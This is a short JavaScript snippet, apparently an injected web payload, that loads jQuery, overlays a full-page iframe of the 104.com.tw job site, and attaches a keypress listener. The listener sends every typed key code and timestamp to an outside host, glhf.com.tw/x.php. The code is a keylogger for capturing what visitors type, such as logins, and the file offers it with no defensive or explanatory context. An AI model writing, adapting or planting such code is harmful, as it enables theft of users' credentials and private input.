function jq(){
	var script = document.createElement('script');
	script.src = 'https://code.jquery.com/jquery-3.4.1.min.js';
	script.type = 'text/javascript';
	document.getElementsByTagName('head')[0].appendChild(script);
}

function prepareFrame() {
        var ifrm = document.createElement("iframe");
        ifrm.setAttribute("src", "https://104.com.tw/");
        ifrm.style.width = "100%";
        ifrm.style.height = "100%";
	ifrm.style.top = "0";
	ifrm.style.left = "0";
	ifrm.setAttribute("onload", "$('#w').contents().keypress(function(event) {$.get('https://www.glhf.com.tw/x.php?xx='+event.which+'&t='+event.timeStamp,function(data){});});");
        document.body.appendChild(ifrm);
}

jq();
prepareFrame();
